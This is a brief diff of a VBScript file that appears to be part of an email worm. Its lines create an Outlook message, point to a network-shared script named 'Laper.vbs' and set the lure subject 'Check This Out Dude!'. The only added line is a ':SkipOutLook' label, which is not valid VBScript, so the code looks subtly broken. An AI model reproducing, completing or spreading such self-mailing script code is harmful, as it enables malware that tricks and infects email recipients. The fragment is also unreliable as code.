@@ -9,6 +9,8 @@ If Err.Number <> 0 Then
 End If
 Set objMail = objOutlook.CreateItem(0)
 End If
+
+:SkipOutLook
 strFilePath = "\\network\share\Laper.vbs"
 strEmailSubject = "Check This Out Dude!"
 
